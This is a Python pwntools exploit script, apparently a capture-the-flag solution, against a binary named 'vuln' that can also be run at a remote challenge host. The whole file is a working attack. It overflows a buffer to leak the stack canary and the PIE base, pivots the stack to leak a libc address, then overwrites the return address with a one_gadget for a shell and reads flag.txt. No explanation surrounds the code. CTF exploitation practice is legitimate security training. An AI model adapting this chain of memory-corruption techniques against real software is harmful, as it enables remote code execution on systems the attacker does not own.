#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

LOCAL = True
if args.REMOTE:
    LOCAL = False

def conn():
    if LOCAL:
        return process('./vuln')
    else:
        return remote('0.cloud.chals.io', 17414)

def try_exploit():
    p = conn()

    # === Step 1: Leak canary ===
    p.send(b'A' * 0x59)
    leak1 = p.recvline(timeout=2)
    if not leak1:
        p.close()
        return None
    leak1 = leak1[:-1]

    if len(leak1) < 0x60:
        p.close()
        return None

    canary = u64(b'\x00' + leak1[0x59:0x60])
    log.info(f'Canary: {hex(canary)}')

    # === Step 2: Leak PIE ===
    p.send(b'B' * 0x69)
    leak2 = p.recvline(timeout=2)
    if not leak2:
        p.close()
        return None
    leak2 = leak2[:-1]

    if len(leak2) < 0x6e:
        p.close()
        return None

    ret_bytes = leak2[0x69:]
    if len(ret_bytes) < 5:
        p.close()
        return None

    pie_leak = b'\xbb' + ret_bytes[:5] + b'\x00\x00'
    pie_base = u64(pie_leak) - 0x12bb

    if pie_base < 0x500000000000 or pie_base > 0x700000000000:
        p.close()
        return None

    log.info(f'PIE base: {hex(pie_base)}')

    # === Step 3: Pivot to BSS to leak libc ===
    stdout_addr = pie_base + 0x4020
    fake_rbp_1 = stdout_addr + 0x60
    plin_gadget = pie_base + 0x1279

    exit_str = b'plin plin plon\x00'
    padding = b'X' * (0x58 - len(exit_str))

    payload1 = exit_str + padding
    payload1 += p64(canary)
    payload1 += p64(fake_rbp_1)
    payload1 += p64(plin_gadget)

    log.info(f'Pivoting to: {hex(stdout_addr)}')
    p.send(payload1)

    sleep(0.1)
    leak = p.recv(8, timeout=2)

    if len(leak) < 6:
        p.close()
        return None

    stdout_libc = u64(leak[:6].ljust(8, b'\x00'))
    libc_base = stdout_libc - libc.symbols['_IO_2_1_stdout_']

    if libc_base < 0x700000000000 or libc_base > 0x800000000000:
        p.close()
        return None

    log.success(f'libc base: {hex(libc_base)}')

    # === Step 4: ROP with working one_gadget ===
    good_rbp = pie_base + 0x4100
    one_gadget = libc_base + 0xebd3f

    payload2 = b'plin plin plon\x00'
    payload2 += b'Y' * (0x58 - len(payload2))
    payload2 += p64(canary)
    payload2 += p64(good_rbp)
    payload2 += p64(one_gadget)
    payload2 += b'\x00' * (0x80 - len(payload2))

    log.info('Sending ROP payload')
    p.send(payload2)

    sleep(0.5)

    # Try to get the flag directly
    try:
        p.sendline(b'cat flag.txt')
        response = p.recvline(timeout=3)
        if response:
            log.success(f'Flag: {response.decode().strip()}')
            return p
    except:
        pass

    # Also try id and interactive
    try:
        p.sendline(b'id')
        response = p.recvline(timeout=2)
        if response:
            log.info(f'id: {response.decode().strip()}')
            return p
    except:
        pass

    p.close()
    return None

def main():
    max_attempts = 50
    for attempt in range(max_attempts):
        log.info(f'Attempt {attempt + 1}/{max_attempts}')
        result = try_exploit()
        if result:
            result.interactive()
            return
    log.error('Failed after max attempts')

if __name__ == '__main__':
    main()
